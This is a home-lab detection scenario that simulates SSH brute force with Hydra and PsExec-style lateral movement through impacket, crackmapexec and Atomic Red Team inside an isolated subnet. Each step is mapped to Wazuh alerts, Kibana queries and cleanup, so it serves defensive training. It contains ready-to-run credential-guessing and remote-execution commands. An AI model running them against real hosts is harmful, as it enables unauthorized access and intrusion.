# Scenario 03: Lateral Movement via SSH Brute Force + PsExec

> **FOR AUTHORIZED HOME LAB USE ONLY**
> This scenario runs exclusively within the isolated UTM lab (192.168.64.0/24).

---

## Scenario Overview

| Field | Value |
|-------|-------|
| **Objective** | Move from kali-attacker to wazuh-manager (SSH) and from victim-windows to wazuh-manager (PsExec-style), demonstrating two lateral movement vectors |
| **Threat Actor Profile** | Attacker with initial foothold on one host attempting to expand across the network |
| **Duration** | ~25 minutes |
| **Complexity** | Intermediate |
| **MITRE Techniques** | T1110.001, T1021.002, T1021.004, T1078 |
| **Rules Exercised** | 100001, 100002, 100003, 100012, 100013 |

---

## MITRE ATT&CK Coverage

| Phase | Technique | Sub-technique | Description |
|-------|-----------|---------------|-------------|
| Credential Access | T1110.001 | Password Guessing | Hydra SSH brute force against wazuh-manager |
| Lateral Movement | T1021.004 | SSH | Attacker pivots to manager via guessed credentials |
| Lateral Movement | T1021.002 | SMB/Windows Admin Shares | PsExec-style service deployment |
| Execution | T1569.002 | Service Execution | PSEXESVC service installed and executed |

---

## Prerequisites

- [ ] kali-attacker VM running (192.168.64.30) — hydra, crackmapexec, impacket installed
- [ ] wazuh-manager VM running (192.168.64.10) — SSH accessible, Wazuh alerts monitoring sshd
- [ ] victim-windows VM running (192.168.64.20) — Sysmon + Wazuh agent active
- [ ] UTM snapshot taken on all VMs before starting

---

## Part A: SSH Brute Force Against wazuh-manager

### Step 1: Reconnaissance from Kali

```bash
# [kali-attacker] Scan the lab network for open services
nmap -sV -p 22,443,3389,5601 192.168.64.0/24

# Expected output:
# 192.168.64.10: port 22 (SSH) open
# 192.168.64.20: port 3389 (RDP) open
# 192.168.64.10: port 5601 (Kibana) open
```

### Step 2: Username Enumeration

```bash
# [kali-attacker] Enumerate valid usernames via SSH timing attack
# (OpenSSH versions < 9.x may leak valid usernames)
for user in soc root admin administrator ubuntu kali; do
  result=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
    -o BatchMode=yes $user@192.168.64.10 2>&1 | head -1)
  echo "$user: $result"
done
```

### Step 3: SSH Brute Force with Hydra

```bash
# [kali-attacker] Password spray against wazuh-manager SSH
# Using a small wordlist to avoid locking the account
hydra -l soc \
  -P /usr/share/wordlists/fasttrack.txt \
  ssh://192.168.64.10 \
  -t 4 \
  -V \
  -I \
  -e nsr \
  -f

# -t 4: 4 threads
# -V: verbose (see each attempt)
# -I: ignore restore file
# -e nsr: also try empty password, user=pass, reversed user
# -f: stop on first valid credential found
```

**Expected:** After 5+ failed attempts, Wazuh rule **100001** (level 10) fires on wazuh-manager.

Watch live on manager:

```bash
# [wazuh-manager] (open a separate SSH session as soc user)
sudo tail -f /var/ossec/logs/alerts/alerts.json | \
  python3 -c "
import sys, json
for line in sys.stdin:
    try:
        d = json.loads(line)
        if str(d.get('rule', {}).get('id', '')) in ['100001', '100002', '5710']:
            print(f\"Rule {d['rule']['id']} [{d['rule']['level']}]: {d['rule']['description']}\")
    except: pass
"
```

### Step 4: Successful Login (Compound Rule)

If hydra finds valid credentials:

```bash
# [kali-attacker] SSH into wazuh-manager using discovered credentials
ssh soc@192.168.64.10

# This triggers Wazuh parent rule 5715 (successful SSH login)
# Combined with the brute-force alert, rule 100002 (level 14) fires
```

---

## Part B: PsExec-Style Lateral Movement on Windows

### Step 5: Set Up Credentials

For this scenario, assume the attacker has obtained credentials via Scenario 02 (LSASS dump).

```powershell
# [victim-windows — Admin PowerShell]
# Verify Administrator access (prerequisite for PsExec)
whoami /priv | Select-String "SeRemoteInteractiveLogonRight|SeNetworkLogonRight"
```

### Step 6: Run PsExec via Atomic Red Team

```powershell
# [victim-windows — Admin PowerShell]
# This installs the PSEXESVC service on THIS host, generating EventID 7045
Invoke-AtomicTest T1021.002 -TestNumbers 2 -GetPrereqs
Invoke-AtomicTest T1021.002 -TestNumbers 2

# Note execution time
Write-Host "PsExec time: $([System.DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ssZ'))"
```

### Step 7: Manual PsExec via impacket (Kali)

```bash
# [kali-attacker] Use impacket psexec.py to remotely execute on victim
# (requires SMB port 445 accessible and valid Windows credentials)
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  SOCAdmin:'Password123!'@192.168.64.20 'whoami'

# This installs PSEXESVC service on victim-windows from kali
# Generates EventID 7045 on victim-windows → Wazuh rule 100012

# Alternative using crackmapexec
crackmapexec smb 192.168.64.20 -u SOCAdmin -p 'Password123!' --exec-method smbexec -x 'whoami'
```

---

## Expected Wazuh Detections

**Kibana queries:**

```
# SSH brute force on manager
rule.id:(100001 OR 100002) AND agent.name:"wazuh-manager"

# PsExec lateral movement on victim
rule.id:(100012 OR 100013) AND agent.name:"victim-windows"
```

| Alert | Rule ID | Level | Host | Trigger |
|-------|---------|-------|------|---------|
| SSH brute force | 100001 | 10 | wazuh-manager | 5+ sshd failures from 192.168.64.30 |
| Brute force + success | 100002 | **14** | wazuh-manager | Failure streak + successful login |
| PsExec service installed | 100012 | 10 | victim-windows | EventID 7045: PSEXESVC |
| Suspicious binary path | 100013 | 12 | victim-windows | EventID 7045: ADMIN$ path |

---

## Evidence to Capture

- [ ] Screenshot of `hydra` output showing failed attempts
- [ ] Kibana screenshot: rule 100001 alert with `srcip:192.168.64.30`
- [ ] Kibana screenshot: rule 100012 alert with `serviceName:PSEXESVC`
- [ ] Wazuh alert JSON showing the escalation from 100001 → 100002 (kill chain)
- [ ] Screenshot of `psexec.py` or `impacket` output showing successful execution

---

## Cleanup

```bash
# [kali] Stop any ongoing hydra scan
# Ctrl+C if still running

# Remove SSH host key if added
ssh-keygen -R 192.168.64.10
```

```powershell
# [victim-windows] Clean up PsExec artifacts
Invoke-AtomicTest T1021.002 -TestNumbers 2 -Cleanup

# Verify service removed
Get-Service PSEXESVC -ErrorAction SilentlyContinue
# Should return nothing if cleaned up

# Remove PsExec tool if downloaded
Remove-Item "C:\Tools\PsExec64.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\PsExec64.exe" -Force -ErrorAction SilentlyContinue
```

**Restore VM snapshots** recommended after this scenario.

---

## Lessons Learned

**For the interview narrative:**
- SSH brute force is one of the highest-volume attack types seen by SOC teams — the frequency+timeframe correlation rule is essential to avoid alert fatigue from individual failures
- The compound rule (100002: brute force → success) dramatically increases confidence in an incident, converting a "possible attack" to a "confirmed breach" automatically
- PsExec detection via EventID 7045 (service install) is highly reliable — PSEXESVC is a near-unique service name that legitimate software never installs
- Lateral movement detection is about correlating timing: PsExec + network logon (EventID 4648) within a short window is the kill-chain signal

**Detection gaps identified:**
- If an attacker uses `pass-the-hash` instead of cleartext credentials, the auth source changes — add EventID 4624 LogonType 9 (NewCredentials) monitoring
- SMB relay attacks don't generate EventID 7045 and would bypass rule 100012
